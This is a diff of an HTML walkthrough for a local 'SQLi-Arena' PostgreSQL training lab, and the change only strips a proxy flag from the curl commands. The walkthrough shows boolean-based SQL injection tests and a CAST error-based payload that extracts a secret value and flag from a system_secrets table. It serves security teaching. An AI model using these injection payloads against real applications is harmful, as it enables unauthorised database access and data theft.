@@ -11,7 +11,7 @@
         <span class="terminal-title">Step 1. Baseline Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=sunset"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=sunset"<br><br>
         <span class="prompt">Response: </span>1 | sunset_beach.jpg | Golden sunset over a tropical beach with palm trees.
     </div>
 </div>
@@ -29,10 +29,10 @@
         <span class="terminal-title">Step 2. Injection Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=' AND 1=1 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=' AND 1=1 -- -"<br>
         <span class="prompt">Response: </span>All 5 images returned (TRUE condition -- all rows match)<br>
         &nbsp;&nbsp;[sunset_beach.jpg, mountain_peak.png, city_skyline.jpg, forest_trail.png, ocean_waves.jpg]<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=' AND 1=2 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=' AND 1=2 -- -"<br>
         <span class="prompt">Response: </span>No images found matching your search. (FALSE condition)<br>
         <span class="prompt">Note: </span>Use empty prefix (not 'sunset') because trailing wildcard is commented out
     </div>
@@ -51,7 +51,7 @@
         <span class="terminal-title">Step 3. CAST Error Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=' AND 1=CAST((SELECT secret_value FROM system_secrets LIMIT 1) AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=' AND 1=CAST((SELECT secret_value FROM system_secrets LIMIT 1) AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_l4rg3_0bj3ct_4bus3}"
     </div>
 </div>
